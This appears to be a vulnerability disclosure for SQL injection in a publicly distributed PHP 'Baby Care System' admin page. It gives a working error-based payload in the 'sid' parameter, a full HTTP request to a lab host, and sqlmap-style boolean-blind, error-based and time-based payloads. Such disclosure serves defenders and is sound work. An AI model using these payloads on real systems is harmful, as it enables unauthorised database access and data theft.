## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/siteoptions.php&social=remove&sid=2

![image](https://user-images.githubusercontent.com/54017627/161355498-1ebd5765-a41e-496d-ad08-7c78cfce40ca.png)

Vulnerability location: /BabyCare/admin.php?id=siteoptions&social=remove&sid=2 //sid is Injection point

[+]Payload:  /BabyCare/admin.php?id=siteoptions&social=remove&sid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //sid is Injection point

```sql
GET /BabyCare/admin.php?id=siteoptions&social=remove&sid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161355323-758b342d-1772-410e-8f49-43541b6ad08f.png)

```sql
---
Parameter: sid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=siteoptions&social=remove&sid=2' RLIKE (SELECT (CASE WHEN (2073=2073) THEN 2 ELSE 0x28 END))-- VDjh

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=siteoptions&social=remove&sid=2' AND EXTRACTVALUE(4201,CONCAT(0x5c,0x7171716b71,(SELECT (ELT(4201=4201,1))),0x7162707a71))-- YSja

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=siteoptions&social=remove&sid=2' AND (SELECT 2185 FROM (SELECT(SLEEP(5)))SlaH)-- rcEz
---
```
![image](https://user-images.githubusercontent.com/54017627/161355507-a2606a11-a320-4575-a4bf-48745f08b463.png)
